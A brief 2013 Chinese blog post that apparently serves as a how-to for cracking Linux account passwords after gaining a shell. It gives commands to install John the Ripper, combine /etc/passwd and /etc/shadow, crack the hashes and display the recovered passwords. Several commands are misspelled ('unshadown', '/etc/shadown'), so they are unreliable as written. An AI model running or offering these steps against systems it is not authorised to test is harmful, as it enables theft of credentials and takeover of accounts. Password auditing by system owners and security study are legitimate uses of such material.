title: 破解Linux密码
date: 2013-03-05 16:08:10
tags:
- safe

---

> 很多时候拿到SHELL后有权限拿到/etc/passwd和/etc/shadown文件，这样有一定几率能破解系统帐户！

<!-- more -->

Debian/Ubuntu
```bash
$ sudo apt-get install john
```

CentOS/RHEL/Fedora/ReadHat
(Download Link)[http://dag.wieers.com/rpm/packages/john/]
```bash
$ rpm -ivh john*
```

Crack Passwd
```bash
$ unshadown /etc/passwd /etc/shadown > /tmp/crack.passwd.db
```

Crack
```bahs
$ john /tmp/crack.passwd.db
```

Show
```bash
$ john -show /tmp/crack.passwd.db
```
